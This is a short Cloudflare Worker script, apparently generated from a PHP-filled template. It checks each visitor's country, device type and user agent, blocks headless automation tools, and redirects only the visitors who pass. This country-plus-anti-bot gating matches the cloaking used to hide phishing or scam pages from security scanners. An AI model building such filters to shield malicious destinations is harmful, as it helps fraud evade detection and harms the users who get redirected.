addEventListener("fetch", event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  const userAgent = request.headers.get("user-agent") || ""
  const ip = request.headers.get("cf-connecting-ip") || ""
  const country = request.headers.get("cf-ipcountry") || "XX"

  // CONFIG (sistem PHP tarafından replace edilecek)
  const TARGET_URL = "__TARGET_URL__"
  const ALLOWED_COUNTRY = "__COUNTRY__"
  const ENABLED_BOT_FILTERS = __BOT_FILTERS__
  const ENABLED_DEVICES = __DEVICES__

  // BOT CHECK
  function isBot() {
    if (ENABLED_BOT_FILTERS.includes("headless") && /HeadlessChrome|puppeteer|selenium|phantomjs/i.test(userAgent)) return true
    if (ENABLED_BOT_FILTERS.includes("ua") && userAgent.length < 40) return true
    return false
  }

  // DEVICE CHECK
  function isAllowedDevice() {
    if (ENABLED_DEVICES.length === 0) return true
    const isMobile = /Mobi|Android/i.test(userAgent)
    const isTablet = /Tablet|iPad/i.test(userAgent)
    const isDesktop = !isMobile && !isTablet
    if (isMobile && ENABLED_DEVICES.includes("mobile")) return true
    if (isTablet && ENABLED_DEVICES.includes("tablet")) return true
    if (isDesktop && ENABLED_DEVICES.includes("desktop")) return true
    return false
  }

  // COUNTRY
  if (country !== ALLOWED_COUNTRY) return new Response("Access denied.", {status: 403})
  if (isBot()) return new Response("Bot traffic blocked.", {status: 403})
  if (!isAllowedDevice()) return new Response("Device not allowed.", {status: 403})

  return Response.redirect(TARGET_URL, 302)
}
